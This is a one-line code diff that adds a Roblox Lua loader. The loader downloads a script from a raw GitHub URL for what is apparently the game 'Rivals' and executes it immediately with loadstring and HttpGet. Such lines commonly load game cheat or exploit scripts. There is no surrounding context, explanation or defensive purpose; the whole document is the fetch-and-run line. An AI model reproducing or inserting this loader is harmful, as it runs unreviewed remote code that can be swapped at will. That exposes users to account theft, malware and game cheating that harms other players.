@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YesD3v/rivals/refs/heads/main/script"))()
